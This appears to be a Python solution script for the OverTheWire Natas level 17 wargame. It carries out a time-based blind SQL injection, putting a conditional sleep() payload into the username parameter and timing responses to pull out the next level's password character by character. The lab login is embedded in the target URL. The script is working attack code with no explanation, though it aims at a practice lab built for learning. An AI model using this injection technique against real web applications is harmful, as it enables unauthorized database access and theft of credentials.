import requests 

target = 'http://natas17:8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw@natas17.natas.labs.overthewire.org/'
allchars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
password = ''

# find chars used
usedchars = 'dghjlmpqsvwxyCDFIKOPR047'

#for c in allchars:	
#	try:
#		r = requests.get(target+'?username=natas18" AND IF(password LIKE BINARY "%' + c + '%", sleep(5), null) %23', timeout=1)
#	except requests.exceptions.Timeout:
#		usedchars += c
#		print(usedchars)


for i in range(32):
	for c in usedchars:
		try:
			#r = requests.post(target + 'index.php', {'username' : 'natas18" AND IF(password LIKE BINARY "'+password+c'%", sleep(5), null)'}, timeout=1)
			r = requests.get(target+'?username=natas18" AND IF(password LIKE BINARY "' + password + c + '%", sleep(5), null) %23', timeout=1)
		except requests.exceptions.Timeout:
			password += c
			print(password)
			break

print(password)
